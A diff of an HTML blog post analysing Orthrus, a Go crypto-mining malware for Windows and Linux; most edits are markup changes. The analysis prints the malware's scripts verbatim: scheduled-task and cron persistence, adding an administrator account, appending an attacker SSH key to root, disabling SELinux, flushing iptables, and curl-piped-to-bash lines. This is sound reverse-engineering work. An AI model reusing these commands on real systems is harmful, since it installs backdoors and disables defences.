@@ -16,9 +16,10 @@
     <meta property="og:title" content="Go Under the Hood: Orthrus" />
 <meta property="og:description" content="Orthrus is a crypto-mining malware targeting both Windows and Linux machines. It&#39;s written in Go and uses the Ethereum blockchain to prevent take-down." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/go-under-the-hood-orthrus/" />
+<meta property="og:url" content="/posts/go-under-the-hood-orthrus/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-03-23T18:00:00+00:00" />
 <meta property="article:modified_time" content="2020-03-23T18:00:00+00:00" />
+
 
 
     
@@ -53,7 +54,7 @@
     <link rel="icon" type="image/png" href="../../images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="../../images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.88.1" />
   </head>
 
   <body class=" ">
@@ -74,10 +75,6 @@
         
           <li class="navigation-item">
             <a class="navigation-link" href="https://go-re.tk">Go Reverse Engineering Tool Kit</a>
-          </li>
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ipfs.io/ipns/gomalware.lekstu.ga">Go Malware</a>
           </li>
         
       
@@ -147,7 +144,7 @@ download other parts of the malware and execute them.</p>
 function of performing the downloading is shown below. If the first <em>URL</em>
 fails, it tries to use a backup URL. All the <em>URLs</em> are included as variables
 in the script file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1"><span style="color:#66d9ef">function</span> Update($url,$backup_url,$path,$proc_name)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1"><span style="color:#66d9ef">function</span> Update($url,$backup_url,$path,$proc_name)
  {        
     Get-Process -Name $proc_name | Stop-Process
     Remove-Item $path
@@ -164,7 +161,7 @@ in the script file.</p>
 </code></pre></div><p>The script checks if the files exist and that the file size is correct.  The
 code snippet below shows the code for downloading all the parts. The comments
 are provided by the author of the code.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1"><span style="color:#75715e">#miner_path</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1"><span style="color:#75715e">#miner_path</span>
 <span style="color:#66d9ef">if</span>((Test-Path $miner_path))
 {
     Write-Output <span style="color:#e6db74">&#34;miner file exist&#34;</span>
@@ -235,23 +232,23 @@ Remove-Item $HOME\update.ps1
 }
 echo F | xcopy /y $payload_path $HOME\update.ps1
 </code></pre></div><p>The script adds persistence via a scheduled task with the command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1">SchTasks.exe /Create /SC MINUTE /TN <span style="color:#e6db74">&#34;Update service for Windows Service&#34;</span> /TR <span style="color:#e6db74">&#34;PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File $HOME\update.ps1&#34;</span> /MO 30 /F
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps1" data-lang="ps1">SchTasks.exe /Create /SC MINUTE /TN <span style="color:#e6db74">&#34;Update service for Windows Service&#34;</span> /TR <span style="color:#e6db74">&#34;PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File $HOME\update.ps1&#34;</span> /MO 30 /F
 </code></pre></div><p>After the <em>miner</em>, <em>scanner</em>, and <em>watchdog</em> processes have been started, a
 <em>kill module</em> is executed. This module is a <em>batch</em> file that is being
 executed.  The batch file&rsquo;s content has changed throughout different campaigns.
 The snippet below shows the content of older campaigns, where a blocking rule
 is added to the firewall.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">netsh advfirewall firewall add rule name=<span style="color:#e6db74">&#34;ipcesi&#34;</span> dir=out action=block remoteip=<span style="color:#e6db74">&#34;43.245.222.57/32&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">netsh advfirewall firewall add rule name=<span style="color:#e6db74">&#34;ipcesi&#34;</span> dir=out action=block remoteip=<span style="color:#e6db74">&#34;43.245.222.57/32&#34;</span>
 </code></pre></div><p>In the current campaign, the malware adds a new account on the machine with the
 code snippet shown below.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch"><span style="color:#66d9ef">echo</span> off
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch"><span style="color:#66d9ef">echo</span> off
 net user sqlbackup P@ssword098 /add
 net localgroup administrators sqlbackup /add
 </code></pre></div><p>The shell script used on infected <em>Linux</em> machines is more complex than its
 <em>Powershell</em> equivalent. As with many other mining malware, it tries to kill
 any other running mining processes. The script executes the commands below in
 the hope to kill as many miners as possible.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kill_miner_proc<span style="color:#f92672">()</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kill_miner_proc<span style="color:#f92672">()</span>
 <span style="color:#f92672">{</span>
     ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;mine.moneropool.com&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
     ps auxf|grep -v grep|grep <span style="color:#e6db74">&#34;pool.t00ls.ru&#34;</span>|awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>|xargs kill -9
@@ -335,7 +332,7 @@ the hope to kill as many miners as possible.</p>
 </code></pre></div><p>The script also kills suspicious processes with the function shown below.  The
 function will kill all the processes executed from the <code>/tmp</code> directory or has
 a high <em>CPU</em> usage. Processes with the malware&rsquo;s module filenames are skipped.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kill_sus_proc<span style="color:#f92672">()</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kill_sus_proc<span style="color:#f92672">()</span>
 <span style="color:#f92672">{</span>
     ps axf -o <span style="color:#e6db74">&#34;pid&#34;</span>|<span style="color:#66d9ef">while</span> read procid
     <span style="color:#66d9ef">do</span>
@@ -365,13 +362,13 @@ a high <em>CPU</em> usage. Processes with the malware&rsquo;s module filenames a
 </code></pre></div><p>To ensure the malware&rsquo;s activity on the infected machine isn&rsquo;t inhibited, the
 script tries to disable <em>SELINUX</em> and flush any cached memory. This is shown in
 the code below.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo SELINUX<span style="color:#f92672">=</span>disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo SELINUX<span style="color:#f92672">=</span>disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null
 sync <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#ae81ff">3</span> &gt;/proc/sys/vm/drop_caches
 </code></pre></div><p>The script tries to rename the binaries for both <code>curl</code> and <code>wget</code>. This is
 shown in the snippet below. This prevents other actors from also infecting the
 machine since the applications usually used for downloading and executing
 setup scripts have a different name.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bbdir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/curl&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bbdir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/curl&#34;</span>
 bbdira<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/cur&#34;</span>
 ccdir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/wget&#34;</span>
 ccdira<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/usr/bin/wge&#34;</span>
@@ -383,7 +380,7 @@ mv /usr/bin/xurl /usr/bin/url
 mv /usr/bin/url /usr/bin/cur
 </code></pre></div><p>Older versions of the script also include the code shown below to uninstall
 Alibaba Cloud agents and Tencent Cloud agents if they are installed.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> ps aux | grep -i <span style="color:#e6db74">&#39;[a]liyun&#39;</span>; <span style="color:#66d9ef">then</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> ps aux | grep -i <span style="color:#e6db74">&#39;[a]liyun&#39;</span>; <span style="color:#66d9ef">then</span>
   $bbdir http://update.aegis.aliyun.com/download/uninstall.sh | bash
   $bbdir http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
   $bbdira http://update.aegis.aliyun.com/download/uninstall.sh | bash
@@ -403,12 +400,12 @@ Alibaba Cloud agents and Tencent Cloud agents if they are installed.</p>
 <span style="color:#66d9ef">fi</span>
 </code></pre></div><p>For persistence, the malware uses cron jobs. The script adds the following
 cron entry if it&rsquo;s running as root:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#34;*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1&#34;</span> &gt;&gt; <span style="color:#e6db74">${</span>crondir<span style="color:#e6db74">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#34;*/30 * * * * sh /etc/update.sh &gt;/dev/null 2&gt;&amp;1&#34;</span> &gt;&gt; <span style="color:#e6db74">${</span>crondir<span style="color:#e6db74">}</span>
 </code></pre></div><p>If it doesn&rsquo;t run as root, the following cron entry is added:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#34;*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1&#34;</span> &gt;&gt; <span style="color:#e6db74">${</span>crondir<span style="color:#e6db74">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#34;*/30 * * * * sh /tmp/update.sh &gt;/dev/null 2&gt;&amp;1&#34;</span> &gt;&gt; <span style="color:#e6db74">${</span>crondir<span style="color:#e6db74">}</span>
 </code></pre></div><p>Older versions of the script also would add an <em>ssh</em> key to the <code>authorized_keys</code>
 for root via the following code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">chmod <span style="color:#ae81ff">700</span> /root/.ssh/
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">chmod <span style="color:#ae81ff">700</span> /root/.ssh/
 echo &gt;&gt; /root/.ssh/authorized_keys
 chmod <span style="color:#ae81ff">600</span> root/.ssh/authorized_keys
 echo <span style="color:#e6db74">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI/oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb/ohYSBb7pK/2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17&#34;</span> &gt;&gt; /root/.ssh/authorized_keys
@@ -450,7 +447,7 @@ it has.</p>
 </table>
 <p>Finally, the malware rewrites the <code>iptables</code> rules and clears some logs, as can
 be seen below. The blocked ports are commonly used by mining pools.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">iptables -F
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">iptables -F
 iptables -X
 iptables -A OUTPUT -p tcp --dport <span style="color:#ae81ff">3333</span> -j DROP
 iptables -A OUTPUT -p tcp --dport <span style="color:#ae81ff">5555</span> -j DROP
@@ -533,7 +530,7 @@ shown below. From the function names, it suggests that the code base is shared
 between both the Linux version and the Windows version of the malware. A deeper
 analysis of the samples confirms that the watchdog for <em>Linux</em> and <em>Windows</em>
 shares the same codebase.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Package _/tmp/0324/dog/cc: /tmp/0324/dog/cc
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Package _/tmp/0324/dog/cc: /tmp/0324/dog/cc
 File: &lt;autogenerated&gt;	
 	init Lines: 1 to 29 (28)	
 File: get_newcc.go	
@@ -632,7 +629,7 @@ malware are still active. The malware includes both code logic for Windows and
 Linux and will execute different functions depending on which operating system
 is used on the infected machine. The <em>ASM</em> snippet below shows the two
 branches.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316b2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_38h</span>]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316b2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_38h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316b7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316bb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_40h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316c0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
@@ -658,7 +655,7 @@ snippet below shows how the filename is generated. The malware uses a random
 number from including 0 to less than, excluding, 1000. The number is added
 to the string shown in the snippet. If the number is <em>666</em>, the corresponding
 filename will be <code>/tmp/kow666kd</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633284</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x3e8</span> <span style="color:#75715e">; 1000
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633284</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x3e8</span> <span style="color:#75715e">; 1000
 </span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0063328c</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633291</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633296</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_60h</span>], <span style="color:#66d9ef">rax</span>
@@ -685,7 +682,7 @@ filename will be <code>/tmp/kow666kd</code>.</p>
 output is written to a file in the <code>/tmp</code> folder. The output file is also using
 a random number to produce a <em>random</em> filename. After it has been executed, the
 script file is removed.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633371</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x3e8</span> <span style="color:#75715e">; 1000
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633371</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x3e8</span> <span style="color:#75715e">; 1000
 </span><span style="color:#75715e"></span><span style="color:#ae81ff">0x00633379</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063337e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633383</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_58h</span>], <span style="color:#66d9ef">rax</span>
@@ -735,7 +732,7 @@ a file which the malware reads. The assembly snippet below shows how the
 malware creates a random filename for the out. A random number between 0 and
 5000 is used for the &ldquo;randomness&rdquo; of the name. The file is written to the
 <code>%TMP%</code> folder and masqueraded as a <em>PNG</em> file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dc2</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.TempDir</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dc2</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.TempDir</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dc7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dcc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dd0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_120h</span>], <span style="color:#66d9ef">rcx</span>
@@ -775,13 +772,13 @@ malware creates a random filename for the out. A random number between 0 and
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633ea8</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
 </code></pre></div><p>The malware uses a <em>scheduled</em> task a persistence method. To check the
 scheduled tasks on the machine, the malware executes:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">    chcp 437 &amp;schtasks /Query /V /FO CSV &gt; %s
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">    chcp 437 &amp;schtasks /Query /V /FO CSV &gt; %s
 </code></pre></div><p>In the command, <code>%s</code> is replaced for the path to the output file described
 earlier. The command <code>chcp</code> is used to change the consoles code page to
 language <em>United States</em>. The commands are written to a batch file in the
 <code>%TMP%</code> folder and executed, this is shown in the code snippet below.  After
 the code is written to the file, the batch file is executed and removed.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633800</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x2710</span> <span style="color:#75715e">; 10000
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633800</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x2710</span> <span style="color:#75715e">; 10000
 </span><span style="color:#75715e"></span><span style="color:#ae81ff">0x00633808</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063380d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633812</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_58h</span>], <span style="color:#66d9ef">rax</span>
@@ -877,7 +874,7 @@ its backup method for finding a new C2 server. The malware uses the <em>Ethereum
 blockchain as a backup method. The snippet below shows that the malware is
 preparing a query to <em>etherscan</em> to lookup the transaction list for the address
 <em>0xb017eFb3339FfE0EB3dBF799Db6cb065376fFEda</em>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0d3</span>  <span style="color:#66d9ef">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x50</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0d3</span>  <span style="color:#66d9ef">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x50</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0d7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_48h</span>], <span style="color:#66d9ef">rbp</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0dc</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_48h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e0e1</span>  <span style="color:#66d9ef">xorps</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">xmm0</span>
@@ -922,7 +919,7 @@ executed.</p>
 downloads the configuration from the URL: <code>{C2URL}/favorite.ico</code>. The file is
 an <em>INI</em> file with a list of MD5 digests. The content of one configuration
 file is shown below.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#66d9ef">[cf]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#66d9ef">[cf]</span>
 <span style="color:#a6e22e">c: db2df2a149f7726ba59cbda815f429fc</span>
 
 <span style="color:#66d9ef">[mm]</span>
@@ -954,7 +951,7 @@ happens to them, it will make sure the process is restarted.</p>
 <h3 id="linux-process-protection-functionality">Linux Process Protection Functionality</h3>
 <p>On Linux, the malware uses <code>ps</code> to check if the process still runs. The command
 executed to check if the miner is still running is shown below.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ps -auxf|grep sysupdate|wc -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ps -auxf|grep sysupdate|wc -l
 </code></pre></div><p>If the output does not contain &ldquo;2&rdquo; a new miner is started. The miner can be
 installed in two different locations, depending on the permissions the malware
 has. The two paths are:</p>
@@ -966,7 +963,7 @@ has. The two paths are:</p>
 it. If the file is missing, the malware downloads the <code>update.sh</code> shell script
 and executes it to install all the files. The logic is shown below in the <em>ASM</em>
 snippet.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334d5</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_cc.Get_miner_path</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334d5</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_cc.Get_miner_path</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334da</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334df</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334e4</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rcx</span>
@@ -1011,7 +1008,7 @@ snippet.</p>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006335ac</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_platform.lin_os_command_exec</span>
 </code></pre></div><p>The same process is used for monitoring the scanner. The following command is
